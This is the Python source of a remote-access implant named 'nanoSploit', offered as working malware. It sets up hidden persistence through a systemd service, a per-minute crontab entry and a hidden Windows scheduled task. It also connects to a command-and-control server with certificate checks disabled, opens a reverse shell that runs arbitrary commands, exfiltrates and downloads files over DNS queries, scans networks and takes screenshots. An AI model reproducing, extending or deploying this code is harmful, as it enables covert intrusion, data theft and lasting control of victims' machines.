import socket
import ssl
import subprocess
import os
import platform
import struct
import sys
import threading
from base64 import b64encode
from shutil import copyfile
from ipaddress import IPv4Network

# Static globals
SYSTEM = platform.system()
LOCK_PATH = "/tmp/nanosploit.lock" if SYSTEM == "Linux" else f"C:/Users/{os.getlogin()}/AppData/Local/Temp/nanosploit.lock"
SYSTEMD_UNIT = """[Unit]
Description=nanoSploit
After=network.target

[Service]
ExecStart={0}/.nanosploit
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
"""


''' SCREENSHOT '''


def take_screenshot() -> bool:
    try:
        # Install external module
        subprocess.check_output("pip install PyGObject".split(" "))
        import gi
        gi.require_version('Gdk', '3.0')
        from gi.repository import Gdk
        # Capture de l'écran sous Linux
        window = Gdk.get_default_root_window()
        x, y, width, height = window.get_geometry()
        pb = Gdk.pixbuf_get_from_window(window, x, y, width, height)
        pb.savev("/tmp/screenshot.png", "png", (), ())
        print("Took screenshot")
    except:
        return False
    return True


''' DNS RECEIVE '''


def get_chunk(domain, server, port) -> bytes:
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)

    # DNS query header
    request_id = 1234
    flags = 0x0100
    qdcount = 1
    header = struct.pack('!HHHHHH', request_id, flags, qdcount, 0, 0, 0)

    # DNS question section
    question = b''
    domain_parts = domain.split('.')
    for part in domain_parts:
        length = len(part)
        question += struct.pack('!B{}s'.format(length), length, part.encode())
    question += b'\x00'
    question_type = 16 # TXT
    question_class = 1
    question += struct.pack('!HH', question_type, question_class)

    # Construct the complete DNS request packet
    request = header + question

    try:
        # Send DNS request
        sock.sendto(request, (server, port))

        # Receive DNS response
        data, addr = sock.recvfrom(1024)
        _, data = data.split(b'get', 1)

        return data[18:]

    except socket.timeout:
        print("DNS request timed out.")

    finally:
        # Close the socket
        sock.close()


def dns_receive(dst_path) -> bool:
    while True:
        chunk = get_chunk("file.get", HOST, 8053)

        if chunk == b"end":
            break
        else:
            with open(dst_path, 'ab') as f:
                f.write(chunk)

    return True


''' NETWORK SCAN '''


def scan_port(ip, port, status_port):
    try:
        # Init socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        # Try connection
        result = sock.connect_ex((ip, port))

        if result == 0:
            status_port[str(port)] = None
            # Check port number for banner grabbing
            if port == 21:
                try:
                    sock.send(b'ftp\r\n')
                    banner = sock.recv(1024)
                    status_port[str(port)] = banner.decode().strip()
                except:
                    pass
            elif port == 22:
                try:
                    banner = sock.recv(1024)
                    status_port[str(port)] = banner.decode().strip()
                except:
                    pass
            elif port == 80:
                try:
                    sock.send(b'GET /robots.txt HTTP/1.1\r\nHost: example.com\r\n\r\n')
                    banner = sock.recv(1024)
                    status_port[str(port)] = banner.decode().strip()
                except:
                    pass
        sock.close()
    except socket.error:
        pass


def scan_ports(ip, start_port, end_port, status_ports: dict):
    status_ports[ip] = {}
    for port in range(start_port, end_port + 1):
        scan_port(ip, port, status_ports[ip])


def ping_host(ip: str) -> bool:
    if platform.system() == "Windows":
        # Ping on Windows
        try:
            subprocess.check_output(f"ping -n 1 -w 1 {ip}", shell=True, universal_newlines=True)
            return True
        except subprocess.CalledProcessError:
            return False
    elif platform.system() == "Linux":
        # Ping on Linux
        try:
            subprocess.check_output(["ping", "-n", "-W1", "-i", "1", "-c", "1", ip])
            return True
        except subprocess.CalledProcessError:
            return False


def scan_ip(ip_target: str, online_ips: list, status_ports: dict):
    if ping_host(ip_target):
        # Check if host is online before scanning
        online_ips.append(ip_target)
        scan_ports(ip_target, 1, 1024, status_ports)


def scan_network_ips(network: IPv4Network) -> str:
    online_ips = []
    threads = []
    status_ports = {}

    output = ""
    output += f"Scanning network {network}...\n"
    for ip in network:
        # Iterate over network ips
        if ip == list(network)[-1]:
            # Don't scan broadcast address
            continue
        # Multi-threaded port scan
        t = threading.Thread(target=scan_ip, args=(str(ip), online_ips, status_ports))
        threads.append(t)
        t.start()

    # Wait for jobs to finish
    for t in threads:
        t.join()

    # Present result in a good shape
    if online_ips:
        output += f"\n\033[4mOnline host(s) IP :\033[0m\n"
        output += "\n".join(online_ips) + "\n"

    if status_ports:
        output += "\n\n\033[4mOpen port by IP :\033[0m\n"
        for host in status_ports:
            if status_ports[host]:
                output += f"{host}:\n"
                for port, banner in status_ports[host].items():
                    output += f"Port {port} open\n"
                    if banner:
                        output += f"Banner: {banner}\n\n"
            else:
                output += f"No open port found on {host} !\n"
    else:
        output += "\nNo port open on any network host !\n"

    return output


def start_network_scan(target: str) -> str:
    target_network = target_ip = None

    # Check if target is single host or network address
    if "/" in target:
        target_network = IPv4Network(target)
    else:
        target_ip = target

    if target_ip:
        # Single host process
        status_ports = {}

        threads = []
        # Multi-threaded port scan
        for port in range(1, 1024):
            t = threading.Thread(target=scan_port, args=(target_ip, port, status_ports))
            threads.append(t)
            t.start()

        # Wait for jobs to finish
        for t in threads:
            t.join()

        # Present result in a good shape
        if status_ports:
            output = ""
            for port, banner in status_ports.items():
                output += f"Port {port} open\n"
                if banner:
                    output += f"Banner: {banner}\n\n"
            return output
        else:
            return f"Not open ports found on {target_ip}"

    elif target_network:
        # Network address process
        return scan_network_ips(target_network)


''' DNS SEND '''


def get_file(file_path) -> bytes | None:
    try:
        with open(file_path, 'rb') as file:
            return file.read()
    except FileNotFoundError:
        print("File not found")
        return None
    except:
        print("Error while attempting to read file")
        return None


def send_chunk(domain, server, port) -> str:
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)

    # DNS query header
    request_id = 1234
    flags = 0x0100
    qdcount = 1
    header = struct.pack('!HHHHHH', request_id, flags, qdcount, 0, 0, 0)

    # DNS question section
    question = b''
    domain_parts = domain.split('.')
    for part in domain_parts:
        length = len(part)
        question += struct.pack('!B{}s'.format(length), length, part.encode())
    question += b'\x00'
    question_type = 1 # A
    question_class = 1
    question += struct.pack('!HH', question_type, question_class)

    # Construct the complete DNS request packet
    request = header + question

    try:
        # Send DNS request
        sock.sendto(request, (server, port))

        # Receive DNS response
        data, addr = sock.recvfrom(1024)

        # Extract the IP address from the response packet
        ip_address = socket.inet_ntoa(data[-4:])

        return ip_address

    except socket.timeout:
        print("DNS request timed out.")

    finally:
        # Close the socket
        sock.close()


def split_into_chunks(content) -> list[str]:
    chunks = []
    domain = ".file"
    chunk_length = 47-len(domain)
    for i in range(0, len(content), chunk_length):
        chunk = content[i:i+chunk_length]
        chunk = b64encode(chunk).decode()+domain
        chunks.append(chunk)
    return chunks


def dns_send(file_path) -> bool:
    content = get_file(file_path)
    if not content:
        return False

    chunks = split_into_chunks(content)
    for chunk in chunks:
        # Send each chunk in a DNS query
        answer = send_chunk(chunk, HOST, 8053)
        if answer == "2.2.2.2":
            print(f"Failed sending chunk '{chunk}'")

    return True


''' PERSISTENCE '''


def check_lock() -> bool:
    # Check if the lock file exists
    if os.path.isfile(LOCK_PATH):
        # Get PID from lock file
        with open(LOCK_PATH, 'r') as file:
            pid = file.read().strip()

        # Check if PID is running
        if SYSTEM == 'Windows':
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.OpenProcess(1, False, int(pid))
            if handle != 0:
                # PID is running
                return True
        elif SYSTEM == "Linux":
            if os.path.exists(f"/proc/{pid}"):
                # PID is running
                return True

    # Create the lock file and write the current PID
    with open(LOCK_PATH, 'w') as file:
        file.write(str(os.getpid()))

    return False


def create_systemd_service(home_path: str):
    user_service_path = f"{home_path}/.config/systemd/user"

    try:
        # Creat systemd service directory
        if not os.path.exists(user_service_path):
            os.makedirs(user_service_path)

        # Write service file
        with open(f"{user_service_path}/nanosploit.service", "w") as f:
            f.write(SYSTEMD_UNIT.format(home_path))

        os.system("systemctl --user enable nanosploit")
        os.system("systemctl --user start nanosploit")
    except:
        return False

    print("Successfully set systemd service !")
    return True


def crontab_task(home_path: str):
    # Write crontab scheduled
    task = f"* * * * * {home_path}/.nanosploit >/dev/null 2>&1"

    # Add task to crontab
    try:
        os.system(f'(crontab -l ; echo "{task}") | crontab -')
    except:
        return False

    print("Successfully set crontab task !")
    return True


def persistence_linux(persistence: dict):
    home_path = os.getenv("HOME")
    payload_path = f"{home_path}/.nanosploit"

    if not os.path.exists(payload_path):
        # Using 'cp' because 'copyfile' remove the executable permission
        os.system(f"cp {__file__} {payload_path}")

    # Run persistence
    persistence["systemd_service"] = "OK" if create_systemd_service(home_path) else "KO"
    persistence["crontab_task"] = "OK" if crontab_task(home_path) else "KO"


def create_scheduled_task(payload_path: str):
    # Check if task already exists
    output = subprocess.run("schtasks /query /fo csv /tn nanoSploit".split(" "), stdout=subprocess.DEVNULL)

    if output.returncode != 0:
        # If error then create task
        try:
            # Execute script with "pythonw.exe" so it doesn't pop a windows
            os.system('schtasks /create /sc MINUTE /mo 1 /tn "nanoSploit" /tr '
                      f'"{sys.executable.replace(".exe", "w.exe")} {payload_path}"')
        except:
            return False
    return True


def persistence_windows(persistence: dict):
    payload_path = f"C:/Users/{os.getlogin()}/AppData/Local/Temp/nanosploit"

    if not os.path.exists(payload_path):
        copyfile(__file__, payload_path)
        os.system(f"attrib +h {payload_path}")

    # Run persistence
    try:
        create_scheduled_task(payload_path)
        persistence["scheduled_task"] = "OK"
    except:
        persistence["scheduled_task"] = "KO"


''' REVERSE SHELL '''


def reverse_shell(ss: ssl.SSLSocket):
    while True:
        # Send 'user:cwd' to server for prompt
        ss.send(b":".join((os.getlogin().encode(), os.getcwd().encode())))

        buffer = ss.recv()
        if buffer:
            # Get command from server
            buffer_arr = buffer.decode().split(" ")

            match buffer_arr[0]:
                case "cd":
                    # Change current directory
                    if len(buffer_arr) < 2:
                        ss.send(b"Missing argument")
                    else:
                        try:
                            os.chdir(buffer_arr[1])
                            ss.send(f"Moved to '{buffer_arr[1]}'".encode())
                        except Exception as e:
                            ss.send(str(e).encode())
                case "exit":
                    # Exit reverse shell
                    break
                case _:
                    # Execute command
                    output = subprocess.run(buffer.decode(), shell=True, capture_output=True, text=True)
                    ss.send(output.stdout.encode() + output.stderr.encode())


''' SECURE SOCKET '''


def init_connection() -> ssl.SSLSocket:
    # Create socket with ssl
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    ss = context.wrap_socket(s)

    # Get server address if exported payload
    global HOST, PORT
    if "HOST" not in globals() and "PORT" not in globals():
        HOST, PORT = "127.0.0.1", 8000

    # Connect to C2 server
    ss.connect((HOST, PORT))

    return ss


def process_instructions(ss: ssl.SSLSocket, persistence: dict):
    while True:
        buffer = ss.recv()
        if buffer:
            print(buffer.decode())
            buffer1 = buffer.split(b" ")[0]
            match buffer1:
                case b"ping":
                    # Check if client is active
                    ss.send(b"pong")
                case b"system":
                    ss.send(SYSTEM.encode())
                case b"shell":
                    # Start reverse shell mode
                    reverse_shell(ss)
                case b"persistence":
                    # Show persistence status
                    ss.send(persistence.__str__().encode())
                case b"exists":
                    # Check if file exists
                    if os.path.isfile(buffer.split(b" ")[1]):
                        ss.send(b"ok")
                    else:
                        ss.send(b"ko")
                case b"send":
                    # Upload a file to server
                    if dns_send(buffer.split(b" ")[1]):
                        ss.send(b"ok")
                    else:
                        ss.send(b"ko")
                case b"receive":
                    # Download a file from server
                    if dns_receive(buffer.split(b" ")[1]):
                        ss.send(b"ok")
                    else:
                        ss.send(b"ko")
                case b"scan":
                    # Start a network scan
                    output = start_network_scan(buffer.split(b" ")[1].decode())
                    ss.send(output.encode())
                case b"screenshot":
                    if take_screenshot():
                        ss.send(b"Saved screenshot, download '/tmp/screenshot.png' to get result.")
                    else:
                        ss.send(b"Failed to get external module or taking screenshot !")
                case _:
                    print(f"Unknown command received: '{buffer.decode()}'")
                    ss.send(b"unknown")
        else:
            print("Lost server connection, exiting...")
            break


''' MAIN '''


def main():
    # Exit if already running
    if check_lock():
        print("Already running, exiting...")
        return
    print("Lock is free !")

    # Persistence
    persistence = {}
    print("Start persistence...")
    if platform.system() == "Linux":
        persistence_linux(persistence)
    elif platform.system() == "Windows":
        persistence_windows(persistence)
    print("Finished persistence !")

    # Start secure connection with C2
    ss = init_connection()
    print("Successfully connected to C2 server !")

    # Handle server commands
    print("Start listening for server instructions...")
    process_instructions(ss, persistence)

    # Exit program and delete lock file
    os.system(f"rm {LOCK_PATH}")
    exit(0)


if __name__ == "__main__":
    main()
